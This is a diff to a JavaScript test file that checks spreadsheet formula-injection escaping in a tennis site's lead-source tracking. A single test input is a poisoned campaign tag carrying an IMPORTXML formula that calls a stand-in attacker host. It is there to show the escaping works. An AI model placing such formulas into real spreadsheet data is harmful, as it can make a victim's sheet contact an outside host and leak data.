@@ -355,14 +355,14 @@ check(
   ["'=HYPERLINK(\"x\")", "'+1", "'-cmd", "'@foo", "'=NOW()", "'\tx", "'\rx"]
 );
 check(
-  "ordinary values pass through, 001 and dates included",
+  "every non-empty value is stored as text: 001 and dates do not coerce, blanks stay blank",
   ["instagram", "001", "2026-10-08", "/", "direct", "", "fall launch"].map(asSheetText),
-  ["instagram", "001", "2026-10-08", "/", "direct", "", "fall launch"]
+  ["'instagram", "'001", "'2026-10-08", "'/", "'direct", "", "'fall launch"]
 );
 check(
   "a poisoned campaign tag reaches the row as text",
   buildLeadSourceCells(visit("https://tennisbootcamp.ca/?utm_source=ig&utm_campaign=%3DIMPORTXML(%22https://evil.example%22,%22//a%22)")),
-  ["ig", "", "'=IMPORTXML(\"https://evil.example\",\"//a\")", "", "", "/", "2026-10-08"]
+  ["'ig", "", "'=IMPORTXML(\"https://evil.example\",\"//a\")", "", "", "'/", "'2026-10-08"]
 );
 check(
   "every lead cell goes through the escape (source, click_id and path too)",
@@ -373,21 +373,21 @@ check(
 // ─── Cells ────────────────────────────────────────────────────────────────────
 
 console.log("cells");
-check("direct", buildLeadSourceCells(null), ["direct", "", "", "", "", "", ""]);
+check("direct (six blanks stay blank)", buildLeadSourceCells(null), ["'direct", "", "", "", "", "", ""]);
 check(
-  "the acceptance row",
+  "the acceptance row (Sheets shows instagram, social, test, /, 2026-10-08)",
   buildLeadSourceCells(visit("https://tennisbootcamp.ca/?utm_source=instagram&utm_medium=social&utm_campaign=test")),
-  ["instagram", "social", "test", "", "", "/", "2026-10-08"]
+  ["'instagram", "'social", "'test", "", "", "'/", "'2026-10-08"]
 );
 check(
   "referrer host as source, bare hostname (no scheme)",
   buildLeadSourceCells(visit("https://tennisbootcamp.ca/", "https://t.co/abc"))[0],
-  "t.co"
+  "'t.co"
 );
 check(
   "utm_term is kept in the record but has no column",
   buildLeadSourceCells(visit("https://tennisbootcamp.ca/?utm_source=g&utm_term=tennis+lessons")),
-  ["g", "", "", "", "", "/", "2026-10-08"]
+  ["'g", "", "", "", "", "'/", "'2026-10-08"]
 );
 
 // ─── Result ───────────────────────────────────────────────────────────────────
